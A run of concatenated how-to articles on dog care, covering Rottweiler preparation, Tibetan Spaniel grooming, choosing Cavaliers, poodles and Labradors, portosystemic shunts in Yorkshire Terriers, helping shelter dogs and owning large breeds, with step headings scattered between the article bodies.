If your policy does not cover Rottweilers, ask if there is a rider to cover you if you adopt a Rottweiler.
If your insurance company refuses to add a rider or to cover you at all with a Rottweiler, call another company to see if they will cover you., Just like with providing the dog with love and affection, you will also need to spend lots of quality time training your Rottweiler. Training is extremely important in raising and caring for any dog, and is especially true for larger and medium energy dogs like Rottweilers. As a result, before adopting a new Rottweiler, begin the process of looking for a trainer.


Start training when the dog is very young, if possible.
Consider enrolling your Rottweiler in an obedience training program.
Continue training at home. Rottweilers are highly intelligent and very trainable. Work toward developing a set of verbal commands that your pup will respond to., One of the most important things you need to do before getting a Rottweiler is to find a vet. Your choice of vet is extremely important, as he or she will be a continued part of you and the dog's life for years to come.


Find a vet that is familiar with the specific problems that Rottweilers, as a breed, can have.
Make sure your vet is relatively close to where you live.
Make sure you are comfortable with your vet.

, After you get your Rottweiler, you'll want to begin the process of socialization as soon as possible. Because of this, you should begin looking for places to do so -- like dog parks -- before you find a dog you want to adopt. Dog parks are great places for you and the dog, as you'll both be able to interact with other dogs and their owners.


Find a dog park that has both a small dog area and a large dog area. Some larger dogs, like Rottweilers, may not know what to make of smaller dogs.
Try to find a dog park close to your house.
Locate a dog park that is actually active and frequented by many dog owners., Before you adopt a Rottweiler, find a store where you can buy supplies for your potential new dog. This is especially important as you'll need to buy food, toys, water and food bowls, and more if you get a Rottweiler.


Look for stores that specialize in dog and pet supplies. Such stores will have the best selection of toys, food, and more.
Visit local box stores to see what sort of selection of food and toys they have. This might be a good option for you.
Consider buying dog supplies online. Major online retailers may have huge selections and competitive prices for pet supplies., Rottweilers have a very interesting history that tells us volumes about why they look and act the way they do. Learning about the dog’s history may help you bring you closer to the dog and tighten the bond and understanding between you. Consider:


Rottweilers as a breed originated in Southern Germany as cattle dogs from about 1500 to about 1800.
During the 1800s, cattle driving became much less common and Rottweilers also waned in popularity and nearly went extinct.
Around 1900, fans of the Rottweiler began a concerted effort to breed the dog. Standards for appearance and behavior were introduced, and the dog underwent a final stage of development that culminated the Rottweilers we know today., Like most other dogs, the size and longevity of Rottweilers varies based on dog. However, there are a number of general factors you should consider and understand before getting your puppy. Rottweilers:


Often weigh between 80 to 135 pounds when mature. Female dogs will often be toward the lighter end of this range.
Grow to be between 22 and 27 inches at maturity. Like with weight, female dogs are often shorter.
Live to be between 8 and 11 years old. This number depends on a wide range of factors, including genetics, and the level of veterinary care you provide., Rottweilers are working dogs that excel in certain areas. Primarily, they have been used for driving cattle and as guard dogs. These activities are reflected in their temperament and behavior. Know that:


Your Rottweiler may be wary toward strangers, and can and will act to protect its family.
Your Rottweiler will bark very loud and often to alert you to danger.
Your Rottweiler may be wary of other dogs.
Your Rottweiler may “herd” people or children if he or she thinks they are being threatened. Do not be unhappy with the dog for this behavior, he or she is just trying to protect your family., As pulchritudinous dogs, Rottweilers can shed considerable amounts of fur. This can offer challenges to owners who want to keep a tidy home. As a result, you need to be ready for tons of grooming and vacuuming.


Brush your de-shed the dog several times a week. Brushing can be done every other day. De-shedding should only be done once or twice a week.
Bathe your every week or two. Bathing will help remove hair, and keep the dog’s skin and fur healthy.
Provide any essential oils or other supplements the dog might need to improve coat health and minimize shedding."

Take off their collar.,
Begin brushing at their head.,
Deal with mats and tangles.,
Brush their coats weekly.,
Brush your Tibbie daily during shedding season.,
Place them in a bathtub or large sink.,
Use warm water to wet their coats.,
Massage shampoo into their fur.,
Rinse thoroughly.,
Dry their coat.,
Bathe them as needed.,
Brush their teeth.,

Check their ears.",How to Groom a Tibetan Spaniel," Before you begin brushing their coat, you’ll need to remove their collar and any other accessories they may have on. You can groom your dog with them in your lap, on a grooming table, or with them on the floor. You may need someone to hold your dog while you’re brushing them if they won’t cooperate.;
, Your Tibbie's coat is smooth on their face and the fronts of their legs and is longer on the rest of their body. The ears, tail, and backs of their front legs have longer hair, which can become more easily tangled. They have a mane of longer hair surrounding their necks.You can use either a wire pin brush or a soft slicker brush. Start brushing at your Tibbie's head and move down their body.

, Matting is more likely to occur in the longer areas of their coat, like around their legs and neck. Slicker brushes are good to untangle any knots that you find in their coat. Mats occur when tangles become so knotted that they form one large knot. You may have to cut out mats with scissors if you are unable to untangle them.Be gentle while untangling knots, since this can pull on your dog’s skin and be painful.


Be very careful when removing any mats in your Tibbie's hair at home. Use small scissors to cut the mat as close to your Tibbie's skin as possible.
For severe mats, take your dog to the veterinarian or a professional groomer to have them removed.

, Tibetan Spaniels shed small amounts of fur year-round. Weekly brushing keeps their coat healthy.Brushing can be a great way to bond with your Tibbie.


You can brush them indoors or outdoors. Brushing them outdoors may make cleaning up after the brushing easier.

, Tibetan Spaniels have a double coat and shed twice a year. A double coat means they have two layers of hair. They typically go through shedding season during the fall and spring, but the time of year might vary. During this time, they need to be brushed daily to remove their undercoat and to encourage new hair to grow. You can use a slicker brush or a pin brush to remove the dead undercoat.Weather permitting, brush your Tibbie outside during shedding season since they’ll lose quite a bit of hair. If you have to brush them indoors, make sure the floor is easy to sweep.
You can also use an undercoat rake during shedding season.

, Tibetan Spaniels are usually less than 15 pounds in weight, so you can either bathe them in a deep sink or in a bathtub. You can also bathe them outdoors if the weather permits. Remove their collar and any other accessories.

, Wet their entire coat with warm, but not hot, water. The water should not fill the tub any higher than their necks. Do not get water in their eyes or ears.Water that gets trapped in their ears can cause ear infections, which Tibetan Spaniels are prone to. To protect their ears, put a cotton ball in both ears while you bathe them.

, You can use a shampoo that is specifically made for dogs for your Tibbie. These shampoos have the right pH-balance to keep their skin and coats healthy, without drying them out. Put a small amount of shampoo into your hands and then work the shampoo into their coats. The shampoo should lather up and remove any dirt or debris that has gotten caught in their coats since their last bath.


Be very careful with shampoo around their eyes, nose, and ears. You can use a soft washcloth to wipe these areas as well.

, Once their entire coat has been shampooed, rinse out the product. Use warm water to rinse out all of the shampoo. This may take two or three rinses, depending on how thick their coats are.While you’re rinsing out their coats, look for any skin irritation, redness, or lumps. These can be signs of a developing skin condition or infection, so if you see anything unusual you should consult your veterinarian.

, You can use a cotton towel to dry their coats after the bath or you can use a blow dryer. Only use a blow dryer on a low or no heat setting. Some owners like to use a spray conditioner or a finishing spray to protect the coat from drying out after a bath, but this is a personal preference., Tibetan Spaniels are relatively clean dogs and their coats do not have much of an odor. You can bathe them every six to eight weeks. They may need to be bathed more frequently if they’ve rolled around in something muddy or smelly. Bathing them too often can strip the skin and hair of its natural oils., Tibetan Spaniels are prone to dental problems, so brushing their teeth is a very important part of their grooming routine. Use a soft toothbrush and a toothpaste that is specifically designed for dogs.Daily brushing is the best way to prevent tooth decay and periodontal disease. At the very least, brush their teeth two to three times a week., Tibetan Spaniels have fast growing nails so you’ll need to trim them frequently.Exercising your dog on concrete or pavement can help wear their nails down naturally, but you should still check to see if they need trimmed every week. When nails are not trimmed regularly, they can crack and chip, which can be painful for your dog.


You can use either a nail clipper or a grinder to keep their nails at a manageable length.
The quick is a vein that runs through the center of the nail. It can be harder to identify on darker colored nails, but when cut it can bleed profusely. Keep some cotton balls and styptic powder handy to stop the bleeding.

, Tibbies have floppy ears that hang down from their head. You should check their ears once a week for any signs of infection. Look for any redness, irritation, swelling, or fluid in the ear.When their ears aren’t checked, there may be a buildup of wax that you’ll need to wipe away. Use a cotton ball and a pH-balanced ear cleaning solution to wipe their inner ears.You can buy ear cleaning solution formulated for dogs at your local pet store or online through pet supply stores.

Determine if it's friendly.,
Focus on how the dog interacts with other animals.,
Choose an active Cavalier.",How to Select a Cavalier King Charles Spaniel2," Cavaliers should be welcoming to people. They are primarily lapdogs that provide entertainment and comfort.Cavaliers can be great for families with young children. Because of their small stature, there is less chance that your children will be hurt accidentally - as is often the case with large lumbering Labradors. Cavaliers can still bite and scratch, but in general they are easy breeds to handle.
Some dogs are conditioned to fear people. Perhaps, they had a traumatic experience early on in life, which has taught them to fear and even strike out at humans. While this behavior can be corrected, it might be a challenge that you're not keen to take on. When you first visit the dog, present your hand and let it take in your scent. Act friendly and don't invade its space too quickly. Attempt to pet and play with the dog. See how the dog responds. If the dog welcomes your attention, then you probably have found a sociable animal., Many families have more than one dog or more than one animal. If this is your situation, then see how your prospective dog plays with its litter mates or other dogs in its area. Does it show aggressive behavior? Does it sulk by itself in the corner of the pen? Or does it join in the fun and lead the pack? You can learn a lot quickly about an animal temperament by seeing it interact with other animals.


If you plan on entering your Cavalier into shows, it will need to be good around other dogs as well. The last thing you want in this situation is to have a beautiful dog, whose behavior distracts judges from its appearance., Cavaliers are energetic spaniels who love to play and explore the out-of-doors. Individuals considering this breed should be prepared to provide regular exercise to keep their Cavalier healthy. For athletic owners, Cavaliers can gradually be trained to accompany you on long walks or hikes.Inactive, even lethargic Cavaliers are unusual. Normally, a downtrodden Cavalier is a sign of a poor upbringing and could signal later behavioral problems.
Do not interpret fatigue for ill-temperament. Young puppies often sleep a lot and so do older dogs. This should not be interpreted negatively; instead, see if you can gently coax the dog awake. Try to play with it. See if you can encourage it to interact with the other dogs. This will give you a better sense of its personality."

Consider the pros of selecting a Purebred Cavalier.,
Assess the drawbacks of getting a mixed breed.,
Consider common Cavalier health issues.",How to Select a Cavalier King Charles Spaniel3," In general, Purebred Cavaliers have predictable traits. If you purchase a Purebred Cavalier, you can expect them to be energetic, lovable house pets with fairly manageable coats. Genetically speaking, Cavaliers have a happy-go-lucky predisposition. If you purchase a Purebred, you can expect such a temperament., Non-Purebred Cavaliers may adopt some of the biological traits of whatever other breed they are mixed with. If they are mixed with a hound, they may have a stronger instinct to hunt and bark. Similarly, if they are bred with low-energy dogs like shih tzu, they may lose that energetic luster that made you fall in love with them in the first place., People covet pure-bred Cavaliers. This means that they have been bred from a limited gene pool. In order to be designated a pure-bred, many places inbreed their dogs, and others unwittingly breed from a gene pool that is too small. This has very real and extremely unfortunate consequences. Pure-bred Cavaliers run a high risk of suffering from heart disease, disc disease, and/or a severe neurological issues. Heart disease: In the UK, 59% of Cavaliers over the age of 4 years old have a heart murmur. At nearly two-thirds of the UK's population of Cavaliers, this is an extraordinary statistic.Chiari malformation and Syringomyelia: Basically, this condition means the dog's skull is too small for its brain. This causes dreadful nerve pain. The veterinary textbook ""Breed Predispositions to Disease in the Dogs and Cats"" lists this condition as ""very common"" with signs developing between 5 months to 3 years of age. Epilepsy: Dogs may develop seizures at any time, but between 6 months to 6 years is the most common time Disc disease: This is another ""common"" condition, especially as Cavaliers age. Most of the time, you won't know that your Cavalier is prone to slip discs, until you see it walking stiffly or reluctantly lowering its head to its food or water bowl.

Find a place to purchase or adopt a Cavalier.,
Think about buying from a breeder.,
Consider rescues.,
Avoid puppy mills.",How to Select a Cavalier King Charles Spaniel4," There are several websites that you can use in order to find both pure breeds and mixed Cavaliers.You can also look in your local newspapers for advertisements. Depending on your location, you’ll have more or less options.

, Find one that can give you the history of the puppy's parents and grandparents, including written health test results. You want to avoid choosing a dog that is the product of inbreeding, so ask to see pedigree papers and quiz breeders about the dog's heritage. If you are buying from a private seller, ask for the same pedigree materials., Rescues are great places to find non-Purebred Cavaliers. Before falling in love with a particular rescue dog, make sure you have a full grasp of the dog's medical needs. Many rescues have ended up at rescue centers because they have medical needs their original owners couldn't handle.

, If you are not sure if you are visiting a puppy mill or not, ask to see the mother. A reputable breeder will be happy to introduce you to the mother and other litter mates. They'll also give you a full rundown of the parents' history. A puppy mill however, will make any excuse they can (and it may sound plausible) to prevent you seeing the mother.

Keep an eye out for the neurological symptoms of PSS.,
Look for the physical signs of PSS.,
Pay attention to a slow recovery from anesthetic.,
Understand the disease.,
Take your dog to a veterinarian.,
Talk to the vet about what type of screening is necessary.,
Discuss the need for specialist expertise.,
Get the dog stabilized.,
Discuss treatment options with your veterinarian.,
Consider medical management instead of surgery.,
Decide whether to go forward with surgery.,
Continue to monitor your dog's condition.",How to Treat Portosystemic Shunts in Yorkshire Terriers," Signs of a PSS take two forms in puppies: neurological signs as a result of toxins acting on the brain and physical symptoms caused by the toxins. Neurological problems cause a variety of issues. The dog may show signs such as drooling or hypersalivation, excessive thirst, seeming disoriented or confused, unsteadiness on the feet (as if drunk), loss of vision, head pressing, seizures, and coma.Typically most dogs show neurological symptoms within 1 - 3 hours of eating, as the levels of toxins peak in the blood at this point.;
, These usually include stunted growth and poor coat condition. Many dogs also have a poor appetite and are prone to regular episodes of vomiting or diarrhea.The physical symptoms of PSS are similar to the symptoms of a variety of other health problems. However, whatever the cause, if you notice these symptoms in your dog, you should get it checked out by a veterinarian.
Some dogs struggle along with waxing and waning symptoms, and the problem becomes gradually worse as the months pass.

, Typically, many dogs with PSS are diagnosed after their desexing surgery. This is because they take an abnormally long time to recover from the anesthetic. In fact, they may be unusually sluggish for days afterwards.This is because the liver has not broken down the anesthetic agents as it would in a healthy dog.

, PSS begins with a developing fetus in the womb. The fetus is supplied with ""clean"" blood, via the placenta, that meets all the puppy's needs. The fetus has no need to ""detox"" placental blood, and so their circulatory system has a specific blood vessel, or shunt, that bypasses the detox center of their liver. All canine fetuses have this shunting blood vessel, but it normally closes within a few days of birth in healthy puppies.However, if the shunt fails to close down after birth, and persists in its activity of bypassing the liver, this can lead to health problems. This is because the process of digestion and the workings of the body produce natural toxins that are potentially poisonous to the dog and affect the brain.
This is where the liver comes in, as one of its function is to be major waste-recycling center that deactivates those toxins into something that is safe in the circulation. When a shunt persists, this toxic blood bypasses the liver and remains in circulation, causing the symptoms associated with a PSS.

, Although you may not be certain that your Yorkie puppy has PSS, the symptoms you are witnessing should be enough to get the dog looked at. Any dog that is having severe digestive and mental problems, such as those connected to PSS, should get a thorough check by a vet.


Keep track of the puppy's symptoms so that you can tell the vet what is going on. Be sure to document when and how often each occurs.

, Your vet may have a suspicion based on the pattern and timing of the dog's symptoms. However, the diagnostic path is a long one that starts with blood screening. This helps eliminate other causes of illness. A specific blood test looking at liver function is run, which is not specific to PSS but can confirm that there is an issue with the liver so the diagnosis should be pursued.Another test that can point towards a PSS is a raised level of ammonia in the blood stream. This is the main toxin resulting from digestion that causes neurological symptoms. However, a raised blood ammonia amplifies the suspicion of a PSS but is not sufficient evidence to reach a conclusive diagnosis., A definitive diagnosis is made by visualizing the shunt itself. This can be done by a skilled ultrasonographer ,who can identify the extra blood vessel and the blood flowing through it. Referral to a specialist center may be necessary to access this level of expertise.


Other imaging options include a CT-scan, after an intravenous contrast agent is given, or nuclear scintigraphy. Both of these methods produce a physical picture of the blood circulation to the liver and the bypassing blood vessel., For most cases, surgically closing the PSS is the ideal solution. However, the patient must first be stabilized in order to reduce the anesthetic risk. This is done using a combination of feeding a high-quality protein, but in reduced quantities, along with dosing with lactulose and an antibiotic called metronidazole.Stabilizing the dog is also appropriate if surgery is not possible for any reason.

, Once PSS has been diagnosed, you will have some decisions to make about how you would like to proceed with treatment. This decision is usually based on a combination of what is best for the dog's condition, what treatments the dog can physically take, and what your financial situation is.

, This includes using the drugs used for stabilization, lactulose and metronidazole. Treatment is continued permanently, or until surgical correction is undertaken.Dogs that are managed medically for the duration of their life, can go on to lead normal lives, but may not live as long as unaffected animals.The rationale behind this therapy is that it is the products of protein breakdown that produce the most toxins. Therefore, feeding the minimum requirement reduces the loading on the system.
Likewise, a toxic metabolite, called ammonia, is produced by the action of bacteria in the bowel. Metronidazole reduces this population of bacteria, leading to less ammonia production, while lactulose encourages food to pass through the bowel so that less ammonia is absorbed.

, Surgical correction of the shunt is preferred, as it is a more permanent solution. However, this is a technically demanding procedure, usually undertaken by a specialist. It involves a general anesthetic and a laparotomy (surgically entering the abdomen) to identify the PSS itself. The shunt is then closed down.The chosen technique for closing the shunt is largely a matter of personal preference by the surgeon. Options include using suture material to tie off the vessel, instilling a special 'glue' that swells to block the shunt, instilling a coil that has a similar effect, or placing a cellophane band around the blood vessel which gradually swells and slowly occludes the shunt., Not all surgeries are 100% successful and sometimes repeat surgery is necessary. Also, the vet may wish to monitor the patient's progress by repeating the liver function tests to check that the body is responding appropriately.This testing helps guide the clinician when it comes to deciding if the dog can transition into a normal adult maintenance food or if it needs to remain on a low protein diet."

Observe the area where the animals are kept.,
Speak with the breeder about the health of the parents.,
Learn about any special concerns when going through a rescue.,
Look for alert, perky, and responsive animals.,
Visit a poodle several times before making a final decision.,
Take your dog or puppy to the vet within 48 hours.",How to Select a Toy Poodle1," When visiting your potential pet, take stock of the area where he is being housed. Whether you're going through a rescue or breeder, you want to make sure conditions are clean. A dog or puppy kept in unsanitary conditions may be at risk for health problems.


The area should be relatively clean. If you're looking at a litter of young puppies, it's understandable if there are a few stray droppings. Puppies are not born house trained and the accidents may have just occurred. However, if the floor is covered in droppings, dirt, and other debris, this is not a clean environment.The poodle or poodles should be clean as well. Their fur should not be covered in food or droppings. Their coats should be clean and un-matted. They should also look relatively healthy. Poodles, puppies especially, should not have a bony appearance.However, there is one exception — if you're going through a rescue and a dog has just come in, he may still show some signs of neglect such as an emaciated appearance.
If animals are being kept in poor conditions, this is a bad sign. If not cared for properly, dogs can develop health conditions, like fleas or ringworm, as well as behavioral problems. You also do not want to give your money to an establishment that is abusing their animals.;
, If you decide to go through a breeder, ask to see any certificates they have about screening tests they put the parents through. Not all breeders do this, in which case you are in the dark about the potential of the parents to pass down genetic disease. If you have an option, patronize a breeder who goes to the trouble of running these tests and can prove their breeding stock is health. Poodles are a generally healthy breed, but you want to know your puppy's family history to spot any health problems that may occur down the road.Hip dysplasia, joint problems, and eye problems like cataracts are common in toy poodles. Chronic conditions, like autoimmune disorders and seizure disorders, may also occur in poodles. If these problems run in a puppy's family, it does not necessarily mean she will inherit them herself. However, it does increase her risk.If you see any health problems listed on your poodle's history, do some research. If your poodle were to develop this condition, consider whether you could handle this. Health problems vary greatly in terms of care. Some conditions, like Addison's Disease, may require long-term treatment that can get costly. Others, like cataracts, can be cleared up with a simple (but expensive) surgery.
Poodles have a reputation for being healthy but are subject to a number of conditions which can impact on their life, even in young or middle age, such as luxating patellas or eyesight problems. If you're working with a quality breeder, he will make an effort to breed out serious conditions., If you're going through a rescue, you'll want to learn about special concerns. Many dogs placed in a rescue or shelter were abandoned or abused in previous homes. This can lead to behavioral or health problems. Review a dog's history in detail before selecting a rescue poodle.


Abuse and neglect are unfortunately common aspects of many rescue dogs' histories. If your poodle has been abused, he may have behavioral problems. He might be skittish or difficult to leave alone. Neglect can also cause health problems. If a dog has been beaten or physically abused, he may have problems with chronic pain.This doesn't mean you shouldn't adopt a dog who has been abused — just be sure you understand that he'll need lots of patience, special attention, love, and training.
Some poodles are abandoned because they have existing health problems. Previous owners may have been unwilling or unable to accommodate the dog's needs. Make sure you ask rescue workers about a dog's health. Know what medications he needs, how much treatment costs, and any other special concerns.

, Unless you're adopting a very elderly poodle, toy poodles are a generally high-energy breed. Make sure any poodle you purchase is eager and playful.If you're going through a breeder, you may notice a couple of poodles from a litter seem high-energy while the others seem a bit sluggish. This is a bad sign. This could mean an illness or infection is going around in the litter. Even if your poodle is not currently sick, she's very likely to get sick later on. Be wary in these situations., Adopting a dog is a big responsibility. You should visit any poodle you're considering several times before making a decision.


Ideally, you should interact with the dog both one-on-one and observe him with other animals. You want a pet that's affectionate and unafraid of people. You also want to make sure your potential dog gets along with other animals. It can be difficult to have a pet that's aggressive or overly skittish in the presence of other dogs.
If you're going through a rescue, it may not be possible to observe your poodle with other dogs. If a dog has known behavioral problems, he may have to be separated from other animals at all times., Once you decide on a poodle, take her to the vet within 48 hours of adoption. You want to have a full exam conducted. You should also bring in a stool sample to check for parasites. If something negative comes up in the exam, you can return the poodle. Most breeders and rescues allow you to change your mind about adopting a dog without penalty within a certain timeframe."

Decide if your personality and lifestyle will be a good fit for a Lab.,
Decide if you have the time and energy for a Lab puppy.,
Think about adopting an adult Lab.,
Decide whether to get a male or female Lab.,
Identify what the dog’s role will be.,
Select a color.",How to Select a Labrador Retriever1," Labs crave company and stimulation, so it is important for you to spend lots of time with your Lab and to invest time and energy in training your Lab. Be honest with yourself about how much time and energy you will be able to invest in your dog.


Think about your how much time you spend away from home. If you are often not home due to work or other lifestyle factors, then a Lab may not be the ideal pet for you.Determine whether you are willing and able to train a dog. Labs are easy to train and they enjoy the stimulation. Before you decide to get a dog, think realistically about how much time you will be able to devote to training your Lab. If you do not plan to train your dog due to time or energy constraints, then a dog may not be the best choice.Consider other lifestyle factors. Labs are great with kids and other pets as well, so a Lab may be a good fit if you have kids and/or other pets.;
, Puppies are hard to train and they require lots of time as well. Before you decide to get a puppy, think about your lifestyle and the amount of time that you can devote to raising a puppy.


For example, will you be willing to get woken up every couple of hours in the middle of the night if your puppy is crying? Will you be able to manage if your puppy chews up one of your favorite pairs of shoes? Are you willing to clean up urine and feces accidents during the housetraining process? If not, then consider adopting an adult dog.On the other hand, there are some positives to getting a puppy. Training your Labrador from a young age creates a fantastic bond between the two of you and you will get to enjoy watching your pet grow and mature.

, Some of the positives of taking on an adult dog is that they are often already house broken and may even know some basic commands, such as sit and stay. Therefore, if you don't have the time or desire to housetrain a dog, then adopting an adult could be the best option for you.One potential downside of an adult dog is he may not be trained, and adult dogs may be harder to train. Also, some dogs may not have been well-socialized and may get spooked by certain things such as other dogs, strangers, etc. Consider whether you have the necessary training skills to correct these problems should you encounter them., Gender is not a big deal unless you already have a dog. If you own a dog already, then getting a dog of the opposite gender will provide the best chance of harmony between your pets.Male dogs tend to be a bit more aggressive, but these behaviors can be controlled with training.
Female dogs often more easygoing, but Labs are such a relaxed breed that this doesn't really matter too much.
Regardless of the gender of your dog, make sure that you spay or neuter the dog unless you intend to breed it.

, The Labrador’s willingness to please makes them easy to train and they make great working dogs. They have many roles in society, ranging from their origins as gun dogs retrieving game, to assistance dogs for the visually impaired.


If you are looking for certain characteristics in a dog for working purposes, then be sure to source a purebred dog from a breeder who raises dogs with the characteristics you require., The most common Lab colors are black, yellow, and chocolate. All colors of Labradors are easy to train, but chocolate Labradors do have a reputation for being more disobedient than their yellow or black cousins. However, there is much debate among breeders and Lab owners about this reputation.Keep in mind that all dogs have different personalities and abilities regardless of color, so color choice is more about your personal preference than anything else."

This will give a dog a new chance at life, and the money from the adoption fee will go towards caring for other dogs looking for forever homes. Don't think that all shelter dogs are Heinz 57 mutts - many purebred dogs end up in shelters or rescue groups because their owners are unable to care for them anymore for a variety of reasons. If you have your heart set on owning a purebred Leonberger, buy from a responsible breeder, and consider making a small donation to an animal rescue or shelter. Never purchase a dog from pet stores or ""backyard breeders."";
, The idea of breeding your dog can seem irresistible, but the responsible choice is to leave breeding to highly experienced individuals who professionally compete or show with their dogs. Our overpopulation problem is big enough that anyone can get a dog for free off Craigslist - don't add to the problem. Instead, why not foster a litter of underage puppies or a pregnant dog for an animal shelter or rescue?


Have your dog neutered or spayed - this will prevent accidental litters, not to mention reap benefits including making your dog healthier and calmer.

, A small donation will always be accepted. It could help support the feeding needs all the dogs seemed to eat up.


Donate money or supplies. You can have a garage sale or other fundraising activity, ask party guests to donate to a shelter instead of bringing gifts, or just drop off a couple of bucks or your dog's old crate. You can also donate services, such as designing a shelter's website.

, Volunteers are what every shelters need. You can help patch up and shape up the shelter to make it more notice-able, and appreciated.


If you're old enough, you can volunteer to walk dogs, socialize puppies, clean cages, and help around the shelter. You can also volunteer in other ways, such as transporting dogs or if you're a professional photographer, taking pictures of dogs.

, It's not like adopting a dog, but you are just a holder until you find a right home for the dog.


Animal shelters are always looking for families willing to foster underage puppies, dogs with slight behavioral problems, or dogs who just need a break from shelter life.

, If you aren't afraid to shout out what you believe in, and make everyone excited about shelter dogs, there would be a lot more traffic toward the shelter. Plus, they'd get hyper about helping out too.

, This does not mean going door to door and tell people about the shelter, but what you can do is speak up. You can make a simple flyer and tape it to the mailboxes.


Raise awareness. Tell others about the shelter, and refer anyone interested in adopting or purchasing a dog to the shelter. Something as simple as having a jar for donating money to a shelter in your store (or a lemonade stand, if you're a kid) can help!

, There is several companies that have fundraising merchandise. But make sure it isn't lousy, pieces of junk that no one wants.

, If the dog is friendly, entice it into your car with treats and keep it in an enclosed area (such as your garage or yard). Report the dog to your local animal control, put Found Dog posters around your neighborhood, and ask around to see if anyone is missing a dog. Keep the dog away from your other pets to prevent fights and the spread of diseases. If you can't keep it, bring it to your local animal control. If the dog isn't friendly, report the dog as loose to animal control, and consider posting signs or posting on Craigslist or another site and describe the dog and where you last saw him/her.

,, Animal cruelty is abusing the animal or neglecting to provide for basic needs. Signs of animal cruelty include the dog having untreated wounds or fur infested with parasites; the dog being extremely thin; the owner physically abusing the dog; the dog being tied up for long periods of time without enough amounts of sanitary food and water; the dog being unable to move; and the dog not having a clean, safe area to live in with shelter from weather. As the methods for reporting animal cruelty vary depending on your location, keep a list of people who will be able to assist you in reporting animal cruelty (someone who rescues dogs, an animal shelter, your vet, and so on) and contact one or more of them if you recognize animal cruelty.

, Doing anything from telling a friend about the animal shelter you volunteer at to protesting against a product that is tested on dogs can help save dogs. You can have a garage sale with proceeds going to your favorite dog rescue, tell the owner of the dog not neutered at the dog park about the benefits of neutering, post a flier about fostering a rescue dog at the neighborhood park, and much more. Grab your leash and get out there!

Understand that feeding a large dog can be expensive.",How to Know if You Can Handle a Big Dog," A full-sized large dog can weigh between 100 and 150 pounds (45 to 68 kg), with some of the larger breeds maxing out at 200 pounds (91kg). Owning and caring for a big dog will require that you lift and move a relatively large amount of weight. This will become particularly important as the dog ages and it loses some of its mobility due to arthritis and other joint issues.If your dog is injured, you may have to pick it up. For any dog over 40 pounds (18kg), make sure that you have someone help you lift it. This will ensure that the dog does not wiggle out of your grasp and fall, injuring itself further.
Because your large dog eats a lot of dog food, you will also need to be able to regularly lift and move heavy bags of dog food.
You could also talk with your veterinarian about your ability to care for a large dog.;
, Some large breed dogs can grow to weigh more than some humans. If you are a smaller statured person, owning a large dog presents some challenges. Because of its size, a larger dog would have a much easier time pushing and pulling you around. This is particularly true if you do not train your dog properly.For example, if you are smaller statured, a large dog may pull you around during walks if it is not trained properly.

, If you know someone who owns a large dog, ask him or her if you could see what it is like to care for such a big animal. Take the dog for a walk and see if you are able to rein the dog in and control it. Take the dog to your place and see if it has enough space to lounge around. Try lifting the animal’s large bags of dog food. If you have any family members, have them meet the dog and spend some time around it.

, Although the prospect of physically handling a large dog may seem daunting, anyone can control a big dog with the proper training. If you leash train your dog and teach it to obey simple commands, you should be able to walk a dog regardless of you or the dog’s size.A big dog should be trained in the same manner as other dogs. Be sure to use an even tone and positive reinforcement to train your dog. Loud voices and harsh reprimands can lead some large breed dogs to develop behavioral issues like obstinacy and aggression.
It is important that your also socialize your dog properly so that it does not get out of control around other dogs.

, If you live in a rental property, check with the owner to make sure that they allow large dogs. Many large property management companies have size, weight, and breed restrictions for the dogs that they allow in their properties. If your property manager does not allow large breed dogs, you may need to reconsider getting a big dog or look for a new place to live.If you are having a difficult time finding places for you and your dog, consider bringing the dog along to meet the owner or create a pet resume to show your dog’s good behavior.

, If you live in a small apartment, a large dog may not be a good fit. Big dogs need space to spread out. Large dogs have a tendency to be clumsy and bump into things, a problem that is magnified in a small apartment. Ideally, a large dog does best in a home with a large yard or park nearby.Because they are accident prone, a large dog might damage your home and knock over or break fragile items.

, Some larger dogs, like German Shepherds, tend to be very active. They need a lot of physical activity and play to stay mentally stimulated and healthy, which a park or green space facilitates.However, many large breed dogs only need about 30 minutes of exercise a day. They spend the rest of their time lounging around.
Make sure that you get a breed of large dog that meets your activity expectations.

, Although most large dog breeds are good with kids, they can be a little clumsy and can hurt small children. Especially when they are young, big dogs have a difficult time accounting for their size and often knock smaller children over. You will want to make sure that a large dog is a good and safe fit for your family.A big dog is a great option for a family with older children who can play with the dog and give it plenty of exercise.

, On average, larger dogs live much shorter lives than small and medium sized dogs. Make sure that you are emotionally capable of handling your dog’s shorter lifespan. It is important the understand that the time that you spend with your dog will be relatively brief, especially if the dog is adopted or rescued.The lifespans of many larger breed dogs is often half of that of smaller dogs. Many small to medium sized dogs can life for 15 to 20 years. However, large dogs may only live for 7 to 10 years.

, Because of their large size, many larger breed dogs develop joint and bone issues as they age. This can limit their mobility and lead to changes in their temperament. Caring for your ailing dog can also be a financial burden due to increased veterinary and medical expenses.In order to help with your dog’s joint health, consider feeding it a diet high in healthy fatty acids.
If you run with your larger dog, try to exercise on dirt or wood chip trails to minimize joint damage.

, A large breed dog will eat between 4 ¼ and 6 cups (435 to 610g) of dog food a day. This is twice as much food as a medium sized dog. Because they eat so much food, you will end up spending significantly more money feeding your large dog. It is important that you understand the financial responsibilities of feeding a big dog before you bring one home.The monthly cost of food for a large dog is about $60. However, this can be significantly higher or lower depending on the quality of food you feed it.

Seek out breeders.,
Learn the signs of a quality breeder.,
Watch for warning signs.,
Be wary of terms like ""teacup"" and ""royal.""",How to Select a Toy Poodle2," If you want to adopt through a breeder, there are many different routes you can take. You should look for reputable breeders in a variety of places. It may take a while to find a breeder that suits your needs.


The Poodle Club of America provides a list of breeders and can verify which breeders abide by their ethical guidelines. This is a good resource to find an ethical breeder near you.The American Kennel Club also provides lists of breeders for a variety of breeds.
If you do not find anyone through these resources, you can do a google search on your own. Be careful, however, as many puppy mills masquerade as reputable breeders. If someone is eager to sell you a puppy without having much contact with you, this may be a puppy mill.Have some patience. It can take a while to find a breeder. When you do find a breeder, it may be a while before they have puppies available for sale. Keep in mind, going into the process, it may take a few months to find a poodle through a breeder.

, As you begin to contact breeders, watch for signs of quality. You do not want to go through an unethical breeder. Your puppy is far more likely to have health problems if you go this route.


